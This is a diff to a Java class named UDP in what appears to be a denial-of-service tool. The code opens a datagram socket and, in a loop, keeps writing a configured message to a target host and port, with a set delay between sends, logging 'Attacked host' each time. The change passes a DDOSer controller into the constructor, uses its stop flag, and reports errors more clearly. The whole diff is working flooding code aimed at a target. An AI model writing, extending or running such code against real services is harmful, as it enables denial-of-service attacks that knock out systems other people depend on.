@@ -22,8 +22,8 @@ public abstract class UDP extends DDOS {
      *
      * @param ddosPattern
      */
-    public UDP(DDOSPattern ddosPattern) {
-        super(ddosPattern);
+    public UDP(DDOSPattern ddosPattern, DDOSer ddoSer) {
+        super(ddosPattern, ddoSer);
     }
 
     /**
@@ -38,13 +38,13 @@ public abstract class UDP extends DDOS {
     public void run() {
         createSocket();
         connectToSocket();
-        while (!Thread.currentThread().isInterrupted() && !socket.isClosed() && DDOSer.stopThread != true) {
+        while (!Thread.currentThread().isInterrupted() && !socket.isClosed() && ddoSer.stopThread != true) {
             writeLineToSocket(getDdosPattern().getMessage());
-            DDOSer.appendToConsole("Attacked host " + getDdosPattern().getHost() + ":" + getDdosPattern().getPort());
+            DDOSer.appendToConsole("Attacked host " + getAddress());
             try {
                 Thread.sleep(getDdosPattern().getTimeout());
             } catch (InterruptedException ex) {
-                ex.getCause();
+                System.out.println("Attack stoped: (" + getAddress() + ")");
             }
         }
         closeSocket();
@@ -58,8 +58,7 @@ public abstract class UDP extends DDOS {
             socket = new DatagramSocket(0);
             socket.setSoTimeout(getDdosPattern().getSocketTimeout());
         } catch (SocketException ex) {
-            DDOSer.appendToConsole("Error while creating or accessing a Socket!");
-            ex.getCause();
+            DDOSer.appendToConsole("Error while creating or accessing a Socket! " + ex.getMessage());
         }
     }
 
